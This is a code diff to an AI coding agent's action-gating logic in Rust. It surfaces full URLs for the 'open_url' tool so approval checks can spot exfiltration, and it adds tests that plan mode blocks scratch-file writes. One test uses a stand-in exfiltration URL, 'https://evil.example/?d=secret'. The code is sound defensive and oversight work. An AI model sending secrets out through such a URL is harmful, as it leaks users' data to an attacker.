@@ -152,6 +152,10 @@ fn action_detail(tool: &str, args: &serde_json::Value) -> Option<String> {
             )
         },
         "web_fetch" => Some(format!("web_fetch {}", s("url")?)),
+        // `execute_command`'s `open_url`: the URL is the whole action,
+        // and exfil-via-URL is the reason it is gated at all, so the
+        // classifier and the approval modal must see it in full.
+        "open_url" => Some(format!("open_url {}", s("url")?)),
         "mcp_proxy" => {
             let server = s("server_name").unwrap_or("?");
             let name = s("tool_name").unwrap_or("?");
@@ -1162,10 +1166,13 @@ mod tests {
         req
     }
 
-    /// Plan-mode ctx: the reducer floors the mode to `ReadOnly` and stamps the
-    /// plan file; mirror both here.
+    /// Plan-mode ctx. `reducer/streaming.rs` passes the LIVE mode
+    /// (`SafetyMode::Plan`, which carries its own read-only floor in the
+    /// engine) and stamps the plan file — it does not substitute `ReadOnly`.
+    /// Mirror that exactly, or these tests exercise a pairing that never
+    /// occurs in production.
     fn ctx_plan() -> ExecContext {
-        let mut c = ctx(SafetyMode::ReadOnly);
+        let mut c = ctx(SafetyMode::Plan);
         c.workdir = PathBuf::from("/repo");
         c.plan_file = Some(PathBuf::from("/repo/.mermaid/plans/x.md"));
         c
@@ -1747,6 +1754,52 @@ mod tests {
             matches!(g, Gate::Block(_)),
             "read-only mode must block scratch mutations",
         );
+    }
+
+    #[tokio::test]
+    async fn plan_mode_denies_a_proven_scratch_contained_mutation() {
+        // Nothing pinned this before. It holds only because
+        // `apply_plan_profile` runs BEFORE the scratchpad downgrade, and
+        // because that downgrade never matches `Deny`. Both facts are
+        // comments, not types — reorder the two blocks and scratch writes
+        // silently open up while a plan is being drafted. Assert the property
+        // directly so the reorder fails here instead of in the field.
+        for request in [
+            shell_request("touch notes.txt"),
+            edit_request("/scratch/notes.txt"),
+        ] {
+            let summary = request.summary.clone();
+            let g = gate(&ctx_plan(), request, &[], serde_json::json!({}), true, true).await;
+            match g {
+                Gate::Block(outcome) => assert!(
+                    outcome
+                        .model_content
+                        .contains("blocked by policy: plan mode"),
+                    "{summary}: expected the plan-flavored denial, got {:?}",
+                    outcome.model_content
+                ),
+                Gate::Proceed { .. } => {
+                    panic!("{summary}: plan mode must not run a scratch-contained mutation")
+                },
+            }
+        }
+    }
+
+    #[test]
+    fn open_url_detail_surfaces_the_url() {
+        // Exfil-via-URL is the reason `execute_command`'s `open_url` is gated
+        // at all, so the classifier and the approval modal must see the URL
+        // itself — a dev-server URL and an exfiltrating one are otherwise
+        // indistinguishable. The gating is covered end-to-end by
+        // `exec::tests::background_open_url_is_policy_gated`; a `gate()`-level
+        // test cannot cover it, because `gate_external` already blocked Web
+        // egress — what was missing was the CALL.
+        let detail = action_detail(
+            "open_url",
+            &serde_json::json!({ "url": "https://evil.example/?d=secret" }),
+        )
+        .expect("open_url detail");
+        assert!(detail.contains("evil.example/?d=secret"), "got {detail:?}");
     }
 
     #[tokio::test]
